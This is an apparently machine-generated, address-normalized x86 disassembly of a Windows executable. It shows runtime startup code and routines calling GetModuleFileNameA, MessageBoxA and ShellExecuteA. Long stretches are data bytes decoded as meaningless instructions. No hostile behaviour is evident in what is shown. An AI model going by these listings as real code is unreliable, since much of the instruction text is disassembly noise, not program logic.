sub_401012
mov eax [ rw-data ]
shl eax 0x2
mov [ rw-data ] eax
push edx
push 0x0
call GetModuleHandleA
mov edx eax
call sub_44ed60
pop edx
call sub_44ecc4
call sub_44eda0
push 0x0
call sub_44ffc4
pop ecx
push rw-data
push 0x0
call GetModuleHandleA
mov [ rw-data ] eax
push 0x0
jmp r-xdata
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x10 ]
and eax 0x1
mov [ rw-data ] eax
call sub_452700
mov edx [ esi + 0x20 ]
push edx
mov ecx [ esi + 0x1c ]
push ecx
call sub_452a38
add esp 0x8
mov eax [ esi + 0x28 ]
push eax
call sub_45065c
pop ecx
mov edx [ esi + 0x44 ]
push edx
call sub_45066c
pop ecx
mov [ rw-data ] 0x1
mov [ rw-data ] esi
lea ecx [ ebp - 0x8 ]
mov [ rw-data ] ecx
call sub_4501ac
call GetEnvironmentStrings
mov [ rw-data ] eax
call GetCommandLineA
mov [ rw-data ] eax
mov eax [ esi + 0x30 ]
push eax
mov edx [ esi + 0x2c ]
push edx
call sub_45472c
add esp 0x8
mov ecx [ esi + 0x40 ]
push ecx
mov eax [ esi + 0x3c ]
push eax
mov edx [ esi + 0x38 ]
push edx
mov ecx [ esi + 0x34 ]
push ecx
call sub_454770
add esp 0x10
call sub_4552c4
mov edi eax
test eax eax
je r-xdata
push 0x0
push rw-data
call sub_4552cc
add esp 0x8
test [ esi + 0x10 ] 0x1
je r-xdata
mov edx [ edi ]
mov [ edi + edx * 4 + 0x4 ] 0xffffffff
push 0x0
push edi
call sub_4552cc
add esp 0x8
xor ecx ecx
mov [ ebp - 0xc ] ecx
lea ebx [ edi + 0x4 ]
jmp r-xdata
mov edx [ rw-data ]
push edx
mov ecx [ rw-data ]
push ecx
mov eax [ rw-data ]
push eax
call [ esi + 0x18 ]
add esp 0xc
push eax
call sub_4546dc
pop ecx
mov ebx [ rw-data ]
jmp r-xdata
mov ecx [ edi ]
cmp ecx [ ebp - 0xc ]
jg r-xdata
mov al [ ebx ]
cmp al 0x20
je r-xdata
mov eax [ ebx ]
mov edx [ eax + 0x14 ]
push edx
push 0x0
call [ eax + 0x18 ]
add esp 0x8
inc [ ebp - 0xc ]
add ebx 0x4
inc ebx
cmp al 0x9
je r-xdata
cmp [ ebx ] 0x22
jne r-xdata
mov dl 0x20
jmp r-xdata
mov dl 0x22
inc ebx
jmp r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp [ ebx ] 0x22
jne r-xdata
cmp dl al
je r-xdata
mov al [ ebx ]
test al al
je r-xdata
inc ebx
jmp r-xdata
cmp al 0x9
jne r-xdata
cmp al 0x9
je r-xdata
cmp al 0x20
je r-xdata
inc ebx
inc ebx
call sub_4555c4
push eax
push ebx
push 0x0
push 0x0
call GetModuleHandleA
push eax
call [ esi + 0x18 ]
add esp 0x10
push eax
call sub_4546dc
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4010d0
mov ecx 0xb4
or ecx ecx
je r-xdata
retn
call sub_45564c
mov [ rw-data ] eax
cmp eax 0x0
jae r-xdata
mov ecx 0xb4
or ecx ecx
je r-xdata
mov eax 0xfc
call sub_40106c
retn
cmp [ rw-data ] 0x0
jae r-xdata
mov ecx 0xb4
push ecx
push 0x8
call GetProcessHeap
push eax
call HeapAlloc
or eax eax
jne r-xdata
mov eax 0xfe
call sub_40106c
push eax
push eax
push [ rw-data ]
call sub_455674
push [ rw-data ]
call sub_455688
pop edi
mov eax 0xfd
call sub_40106c
sub_4010f3
cmp [ rw-data ] 0x0
jb r-xdata
retn
push [ rw-data ]
call sub_455664
or eax eax
je r-xdata
push eax
push 0x8
call GetProcessHeap
push eax
call HeapFree
push [ rw-data ]
call sub_455690
sub_401150
push ebx
add esp 0xfffffef8
push 0x105
lea eax [ esp + 0x4 ]
push eax
mov eax [ rw-data ]
push eax
call GetModuleFileNameA
mov eax esp
call sub_44e010
mov ebx eax
mov [ rw-data ] ebx
test ebx ebx
jne r-xdata
mov eax rw-data
call sub_44e2f8
add esp 0x108
pop ebx
retn
mov eax [ rw-data ]
mov [ rw-data ] eax
sub_4011bc
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x8 ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov [ ecx ] dl
mov [ rw-data ] dl
mov [ rw-data ] 0x0
mov [ rw-data ] 0x1
mov [ rw-data ] 0x1
jmp r-xdata
pop ebp
retn
mov eax sub_4011bc
call sub_44de00
mov [ rw-data ] eax
mov eax rw-data
call sub_44de00
mov [ rw-data ] eax
call GetCommandLineA
mov edx [ rw-data ]
mov [ edx ] eax
mov al [ ebp + 0x14 ]
xor al 0x1
mov edx [ rw-data ]
mov [ edx ] al
mov [ rw-data ] eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] 0x1
call sub_401150
cmp [ rw-data ] 0x0
jne r-xdata
sub_401258
push ebx
push esi
mov ebx [ rw-data ]
cmp [ rw-data ] 0x0
jne r-xdata
call sub_40119c
pop esi
pop ebx
retn
cmp [ ebx ] 0x0
je r-xdata
mov edx [ ebx ]
mov eax edx
xor edx edx
mov [ ebx ] edx
mov esi eax
call esi
cmp [ ebx ] 0x0
jne r-xdata
sub_401288
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4012ad
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4012b4
retn
sub_4012c0
push ebp
mov ebp esp
add esp 0xffffffd4
mov eax rw-data
push ebx
push esi
push edi
call sub_44f3b0
mov [ ebp - 0x1c ] 0x8
mov edx [ rw-data ]
mov eax [ edx ]
call sub_425048
mov [ ebp - 0x1c ] 0x14
mov edx rw-data
lea eax [ ebp - 0x8 ]
call sub_4595e4
inc [ ebp - 0x10 ]
mov edx [ eax ]
mov ecx [ rw-data ]
mov eax [ ecx ]
call sub_424b10
dec [ ebp - 0x10 ]
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_459658
mov ecx [ rw-data ]
mov eax [ ecx ]
mov ecx [ rw-data ]
mov edx [ rw-data ]
call sub_425068
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx [ rw-data ]
mov edx [ rw-data ]
call sub_425068
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4250fc
mov [ ebp - 0x1c ] 0x0
jmp r-xdata
xor eax eax
mov edx [ ebp - 0x2c ]
mov [ fs : 0x0 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_401360
mov edx [ rw-data ]
mov eax [ edx ]
mov edx [ ebp - 0x4 ]
call sub_4253d4
mov [ ebp - 0x1c ] 0x10
call sub_456701
xor eax eax
mov edx [ ebp - 0x2c ]
mov [ fs : 0x0 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_4013b3
inc [ ebx ]
add [ eax ] al
add [ eax + eax + 0x48 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax - 0x6a ] bl
inc ebp
add [ ebx ] al
add [ eax + eax + 0x53 ] cl
jns r-xdata
add [ eax ] al
test al 0x13
inc eax
add [ eax + eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
cmp bh [ edx ]
inc ecx
outsb
jae r-xdata
add [ eax ] al
add [ eax + 0x4004013 ] ch
add [ eax ] al
add [ eax ] al
push ebx
je r-xdata
mov ecx [ ebp - 0x28 ]
mov [ fs : 0x0 ] ecx
mov [ ebp - 0x18 ] 0x8
dec [ ebp - 0xc ]
mov edx 0x2
mov eax [ ebp - 0x4 ]
add eax 0x4
call sub_459658
dec [ ebp - 0xc ]
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffffd8
push ebx
call sub_45984d
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax rw-data
call sub_44f3b0
mov [ ebp - 0xc ] 0x2
test bl bl
jl r-xdata
imul ebp [ esi + 0x67 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x0
add [ eax ] al
add eax [ eax ]
xor [ eax ] al
add [ eax ] al
add [ eax ] al
mov bh 0x0
add [ eax ] al
inc esp
add [ eax + eax ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ esp + edx + 0x40 ] bl
add [ ebx ] al
add [ eax ] bl
push ebx
jns r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_459840
xor edx edx
mov eax [ ebp - 0x4 ]
jne r-xdata
call sub_44c060
inc ebp
cld
imul ebp [ ebx + esi * 2 + 0x3a ] 0x6378453a
jo r-xdata
test bl bl
jle r-xdata
mov [ 0x0 ] ecx
imul ebp [ edi + 0x6e ] 0x4014c400
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_40145c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
call sub_45984d
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax rw-data
call sub_44f3b0
mov [ ebp - 0xc ] 0x2
test bl bl
jl r-xdata
mov ecx [ ebp - 0x28 ]
mov [ fs : 0x0 ] ecx
test bl bl
jle r-xdata
mov [ ebp - 0x18 ] 0x8
dec [ ebp - 0xc ]
mov edx 0x2
mov eax [ ebp - 0x4 ]
add eax 0x4
call sub_459658
dec [ ebp - 0xc ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_44c060
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_459840
sub_4014c4
add al 0x0
add [ eax ] al
add eax [ eax ]
xor [ eax ] al
add [ eax ] al
add [ eax ] al
mov bl 0x0
add [ eax ] al
inc eax
add [ eax + eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax - 0x40 ] ah
inc esp
add [ ebx ] al
add [ eax ] cl
push ebx
jns r-xdata
add [ eax ] al
add [ ebx + 0x7d80fc45 ] cl
xlat
add [ ebp + eax - 0x18 ] dh
0x582
je r-xdata
add [ ebx - 0x74f00bbb ] al
push ebp
fsub [ ecx + ecx * 4 + 0x15 ]
add [ eax ] al
add [ eax ] al
insd
cmp bh [ edx ]
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax ] si
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
nop
add [ eax + eax ] cl
clc
adc eax [ eax ]
inc ebp
js r-xdata
pop ebx
mov esp ebp
pop ebp
retn
call sub_459845
in al dx
add esp 0xffffffd4
push ebx
mov [ ebp - 0x8 ] dl
test dl dl
jle r-xdata
jo r-xdata
mov ebx ecx
mov [ ebp - 0x29 ] dl
call sub_459838
mov [ ebp - 0x4 ] eax
mov eax rw-data
call sub_44f3b0
mov [ ebp - 0x18 ] 0x8
mov ecx ebx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41c694
add [ ebp - 0xc ] 0xe
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x29 ] 0x0
je r-xdata
push ebp
xlat
imul ebp [ edi + 0x6e ] 0x55002a20
mov ebp esp
add esp 0xffffffd4
push ebx
mov [ ebp - 0x8 ] dl
test dl dl
jle r-xdata
pop ebx
mov esp ebp
pop ebp
retn
call sub_459845
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x29 ] 0x0
je r-xdata
mov ebx ecx
mov [ ebp - 0x29 ] dl
mov [ ebp - 0x4 ] eax
mov eax rw-data
call sub_44f3b0
mov [ ebp - 0x18 ] 0x8
mov ecx ebx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_401580
add [ ebp - 0xc ] 0xf
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
call sub_459838
sub_401580
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
mov [ ebp - 0x8 ] dl
test dl dl
jle r-xdata
mov ebx ecx
mov [ ebp - 0x29 ] dl
mov [ ebp - 0x4 ] eax
mov eax rw-data
call sub_44f3b0
mov [ ebp - 0x18 ] 0x8
mov ecx ebx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41c694
add [ ebp - 0xc ] 0xe
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x29 ] 0x0
je r-xdata
call sub_459838
pop ebx
mov esp ebp
pop ebp
retn
call sub_459845
sub_4015d8
add al 0x0
add [ eax ] al
nop
add [ eax + eax ] cl
test [ ecx ] bl
inc eax
add [ esi + eax * 2 + 0x6f ] dl
jb r-xdata
jpe r-xdata
xor [ eax ] esp
sub al [ eax ]
nop
nop
nop
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x1 ] cl
mov edx [ eax + 0x2d0 ]
mov eax [ eax + 0x2d8 ]
mov edx [ edx + 0x128 ]
call sub_426f18
pop ecx
pop ebp
retn 0x8
add [ eax ] al
mov eax [ eax + 0x2e0 ]
mov edx [ edx + 0x128 ]
call sub_426f18
pop ecx
pop ebp
retn 0x8
add [ ebp + 0x1c ] esi
xor ecx ecx
mov [ edx + 0xc ] ecx
mov edx [ eax + 0x2e4 ]
sub_401614
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x1 ] cl
mov edx [ eax + 0x2dc ]
cmp [ edx + 0xc ] 0x1
jne r-xdata
pop ecx
pop ebp
retn 0x8
xor ecx ecx
mov [ edx + 0xc ] ecx
mov edx [ eax + 0x2d4 ]
mov eax [ eax + 0x2d8 ]
mov edx [ edx + 0x128 ]
call sub_426f18
sub_401648
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x1 ] cl
mov edx [ eax + 0x2dc ]
cmp [ edx + 0xc ] 0x1
jne r-xdata
pop ecx
pop ebp
retn 0x8
xor ecx ecx
mov [ edx + 0xc ] ecx
mov edx [ eax + 0x2e4 ]
mov eax [ eax + 0x2e0 ]
mov edx [ edx + 0x128 ]
call sub_426f18
sub_40167c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x1 ] cl
mov edx [ eax + 0x2dc ]
cmp [ edx + 0xc ] 0x1
jne r-xdata
pop ecx
pop ebp
retn 0x8
xor ecx ecx
mov [ edx + 0xc ] ecx
mov edx [ eax + 0x2f4 ]
mov eax [ eax + 0x2ec ]
mov edx [ edx + 0x128 ]
call sub_426f18
sub_4016b0
push ebp
mov ebp esp
add esp 0xfffffdd0
push esi
push edi
mov eax rw-data
call sub_44f3b0
lea edi [ ebp - 0x130 ]
mov esi rw-data
mov ecx 0x41
lea edx [ ebp - 0x130 ]
[ edi ] [ esi ]
mov ax [ rw-data ]
lea edi [ ebp - 0x230 ]
mov [ ebp - 0x2b ] ax
mov al [ rw-data ]
mov [ ebp - 0x29 ] al
mov ecx 0x40
mov esi rw-data
[ edi ] [ esi ]
mov [ ebp - 0x18 ] 0x8
xor eax eax
mov [ ebp - 0x4 ] eax
inc [ ebp - 0xc ]
mov [ ebp - 0x18 ] 0x14
push 0x104
push edx
push 0x0
call GetModuleFileNameA
push 0x0
push 0x0
lea ecx [ ebp - 0x230 ]
push ecx
lea eax [ ebp - 0x2b ]
push eax
lea edx [ ebp - 0x130 ]
push edx
call sub_450e9c
add esp 0x14
lea ecx [ ebp - 0x230 ]
lea eax [ ebp - 0x2b ]
lea edx [ ebp - 0x4 ]
push ecx
push eax
push rw-data
push edx
call sub_4596d8
add esp 0x10
push 0x5
push 0x0
push 0x0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx rw-data
mov ecx [ ebp - 0x4 ]
jmp r-xdata
push ecx
push rw-data
push 0x0
call ShellExecuteA
dec [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_459658
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_4017a0
push ebp
mov ebp esp
add esp 0xfffffdd0
push ebx
push esi
push edi
mov ebx eax
mov eax rw-data
call sub_44f3b0
lea edi [ ebp - 0x130 ]
mov esi rw-data
mov ecx 0x41
lea edx [ ebp - 0x130 ]
[ edi ] [ esi ]
mov ax [ rw-data ]
lea edi [ ebp - 0x230 ]
mov [ ebp - 0x2b ] ax
mov al [ rw-data ]
mov [ ebp - 0x29 ] al
mov ecx 0x40
mov esi rw-data
[ edi ] [ esi ]
mov [ ebp - 0x18 ] 0x8
xor eax eax
mov [ ebp - 0x4 ] eax
inc [ ebp - 0xc ]
mov [ ebp - 0x18 ] 0x14
push 0x104
push edx
push 0x0
call GetModuleFileNameA
push 0x0
push 0x0
lea ecx [ ebp - 0x230 ]
push ecx
lea eax [ ebp - 0x2b ]
push eax
lea edx [ ebp - 0x130 ]
push edx
call sub_450e9c
add esp 0x14
push 0x0
push rw-data
push rw-data
push ebx
call MessageBoxA
lea ecx [ ebp - 0x230 ]
lea eax [ ebp - 0x2b ]
push ecx
push eax
lea edx [ ebp - 0x4 ]
push rw-data
push edx
call sub_4596d8
add esp 0x10
push 0x5
push 0x0
push 0x0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx rw-data
mov ecx [ ebp - 0x4 ]
jmp r-xdata
push ecx
push rw-data
push 0x0
call ShellExecuteA
dec [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_459658
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4018b0
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
mov ebx eax
mov eax [ ebx + 0x2dc ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov [ eax + 0xc ] 0x1
mov edx [ ebx + 0x2d0 ]
mov eax [ ebx + 0x2d8 ]
mov edx [ edx + 0x128 ]
call sub_426f18
mov ecx [ ebx + 0x2e8 ]
mov eax [ ebx + 0x2e0 ]
mov edx [ ecx + 0x128 ]
call sub_426f18
mov ecx [ ebx + 0x2f0 ]
mov eax [ ebx + 0x2ec ]
mov edx [ ecx + 0x128 ]
call sub_426f18
sub_401918
add al 0x0
add [ eax ] al
nop
add [ eax + eax ] cl
sub al 0x19
inc eax
add [ esi + eax * 2 + 0x6f ] dl
jb r-xdata
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add ah dh
sbb [ eax ] eax
add eax [ eax ]
dec esp
add [ esi + eax * 2 + 0x6f ] dl
jb r-xdata
and [ edx ] ch
add al dl
add al [ eax ]
add [ ebx ] al
add [ eax ] dh
add [ eax ] al
add [ eax ] al
add [ edi + 0x40000000 ] dh
add [ eax ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sldt [ eax ]
add [ edi ] cl
add [ eax ] al
add [ eax + 0x1b ] ch
inc eax
add [ ebx ] al
add [ eax + eax + 0x46 ] dl
outsd
jb r-xdata
mov [ 0x0 ] edx
cmp [ ebp - 0x25 ] 0x0
jle r-xdata
xor [ eax ] eax
add [ ecx + ebx ] ch
inc eax
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
jae r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
call sub_459840
push esi
lea esi [ ebp - 0x30 ]
mov [ ebp - 0x4 ] ecx
mov ebx edx
call sub_44f3b0
mov [ esi + 0x1c ] 0x2
lea edx [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_45961c
inc [ esi + 0x1c ]
lea edx [ ebp + 0x8 ]
mov [ esi + 0x10 ] 0x8
lea eax [ ebp + 0x8 ]
call sub_45961c
inc [ esi + 0x1c ]
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
call sub_45961c
inc [ esi + 0x1c ]
mov edx [ eax ]
lea eax [ ebp - 0x8 ]
push edx
lea edx [ ebp - 0x4 ]
mov [ esi + 0x10 ] 0x14
call sub_45961c
inc [ esi + 0x1c ]
mov ecx [ eax ]
mov edx ebx
mov eax [ r-xdata ]
call sub_442c84
dec [ esi + 0x1c ]
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_459658
dec [ esi + 0x1c ]
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_459658
dec [ esi + 0x1c ]
lea eax [ ebp + 0x8 ]
mov edx 0x2
call sub_459658
dec [ esi + 0x1c ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_459658
mov ecx [ esi ]
mov [ fs : 0x0 ] ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor [ eax ] esi
jmp 0x72d41a2c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
add [ eax ] al
adc [ eax ] al
add [ eax ] al
hlt
cmp dl [ esi + eax * 2 + 0x6f ]
jb r-xdata
sbb [ eax ] eax
pop es
push es
push esp
inc esi
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
rcr [ ebx ] 0x40
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
add al [ eax ]
add [ ebx ] al
add [ eax ] dh
add [ eax ] al
add [ eax ] al
add [ edi + 0x38000000 ] dh
add [ eax ] cl
add [ eax ] al
add [ eax ] al
sub_401a40
push ebp
mov ebp esp
add esp 0xffffffd0
mov eax rw-data
push ebx
push esi
lea esi [ ebp - 0x30 ]
mov [ ebp - 0x4 ] ecx
mov ebx edx
call sub_44f3b0
mov [ esi + 0x1c ] 0x2
lea edx [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_45961c
inc [ esi + 0x1c ]
lea edx [ ebp + 0x8 ]
mov [ esi + 0x10 ] 0x8
lea eax [ ebp + 0x8 ]
call sub_45961c
inc [ esi + 0x1c ]
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
call sub_45961c
inc [ esi + 0x1c ]
mov edx [ eax ]
lea eax [ ebp - 0x8 ]
push edx
lea edx [ ebp - 0x4 ]
mov [ esi + 0x10 ] 0x14
call sub_45961c
inc [ esi + 0x1c ]
mov ecx [ eax ]
mov edx ebx
mov eax [ r-xdata ]
call sub_442c84
dec [ esi + 0x1c ]
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_459658
dec [ esi + 0x1c ]
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_459658
dec [ esi + 0x1c ]
lea eax [ ebp + 0x8 ]
mov edx 0x2
call sub_459658
dec [ esi + 0x1c ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_459658
mov ecx [ esi ]
mov [ fs : 0x0 ] ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_401b08
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
mov [ ebp - 0x8 ] dl
test dl dl
jle r-xdata
mov ebx ecx
mov [ ebp - 0x29 ] dl
mov [ ebp - 0x4 ] eax
mov eax rw-data
call sub_44f3b0
mov [ ebp - 0x18 ] 0x8
mov edx [ ebp + 0x8 ]
mov ecx ebx
push edx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41c86c
add [ ebp - 0xc ] 0xe
mov ecx [ ebp - 0x28 ]
mov [ fs : 0x0 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x29 ] 0x0
je r-xdata
call sub_459838
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_459845
sub_401b68
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
call sub_45984d
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax rw-data
call sub_44f3b0
mov [ ebp - 0xc ] 0xe
test bl bl
jl r-xdata
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
test bl bl
jle r-xdata
mov [ ebp - 0x18 ] 0x8
sub [ ebp - 0xc ] 0xe
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41ca98
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_459840
sub_401d0b
inc [ ebx ]
add [ eax ] al
add [ eax + eax + 0x60 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al bl
sbb eax 0x30040
add [ fs : ebx + 0x79 ] dl
jae r-xdata
outsb
je r-xdata
insd
cmp bh [ edx ]
inc esp
insb
jo r-xdata
mov [ ecx ] 0x0
add [ eax ] al
outsd
insb
add [ eax ] al
add [ eax ] dh
push ds
inc eax
add [ eax ] al
add [ eax ] al
add [ ebx ] al
outsb
inc ebx
outsd
imul ecx [ ecx + 0x6e ] 0x66726574
popad
arpl [ ebp + 0x3c ] sp
inc esi
outsd
jb r-xdata
pop esi
pop ebx
retn
push ebx
call sub_44e6dc
pop ecx
pop esi
pop ebx
retn
mov eax [ ebx ]
test eax eax
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebx + 0x1480040 ] dl
jae r-xdata
xor ecx ecx
test esi 0x1
mov [ ebx ] ecx
je r-xdata
push eax
mov edx [ eax ]
call [ edx + 0x8 ]
or [ eax ] eax
add [ eax ] al
or [ eax ] eax
add [ eax ] al
and al bh
inc edx
add [ ebx ] al
add [ eax + eax + 0x43 ] bl
outsd
outsb
je r-xdata
cmp cl [ ecx + 0x4f ]
insb
inc esi
outsd
jb r-xdata
push ebx
call sub_44e6dc
pop ecx
mov [ ebx ] ecx
je r-xdata
add eax [ ebp + 0x500674c0 ]
mov edx [ eax ]
call [ edx + 0x8 ]
xor ecx ecx
test esi 0x1
outsd
insb
jae r-xdata
add [ eax ] al
test al 0x13
inc eax
add [ eax + 0x1 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebx
push esi
mov esi edx
mov ebx eax
xchg esp eax
push ds
inc eax
add [ eax + 0x1 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
[ eax ] eax
add [ ebx ] al
add [ eax ] dh
add [ eax ] al
add [ eax ] al
add [ edi + 0x48000000 ] dh
add [ eax ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test ebx ebx
je r-xdata
mov ebx eax
cmp dl [ edi + edx * 2 + 0x69 ]
sub_401f90
add al 0x0
add [ eax ] al
add eax [ eax ]
xor [ eax ] al
add [ eax ] al
add [ eax ] al
mov bh 0x0
add [ eax ] al
dec eax
add [ eax ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
add al [ eax ]
add [ eax ] al
ror ah 0x1
inc ebx
add [ ebx ] al
add [ eax + eax + 0x43 ] bl
insb
popad
jae r-xdata
call 0xffffffffcbcb2045
xor edx edx
mov eax [ ebp - 0x4 ]
jae r-xdata
pop ebx
mov esp ebp
pop ebp
retn
call sub_459845
in al dx
add [ rw-data ] 0x1
jb r-xdata
cmp dl [ eax + edx * 2 + 0x65 ]
jb r-xdata
pop ebp
retn
pop ebp
retn
call sub_401580
add [ ebp - 0xc ] 0xf
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x29 ] 0x0
je r-xdata
cld
imul esi [ ebx + 0x74 ] 0x746e65
add [ eax ] al
add ah al
adc al 0x40
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
sub [ rw-data ] 0x1
jb r-xdata
pop ebp
retn
pop ebp
retn
sub_402010
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
mov [ ebp - 0x8 ] dl
test dl dl
jle r-xdata
mov ebx ecx
mov [ ebp - 0x29 ] dl
mov [ ebp - 0x4 ] eax
mov eax rw-data
call sub_44f3b0
mov [ ebp - 0x18 ] 0x8
mov ecx ebx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_401580
add [ ebp - 0xc ] 0xf
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x29 ] 0x0
je r-xdata
call sub_459838
pop ebx
mov esp ebp
pop ebp
retn
call sub_459845
sub_402068
add al 0x0
add [ eax ] al
nop
add [ eax + eax ] cl
and [ eax ] 0x40
add [ esi + eax * 2 + 0x6f ] dl
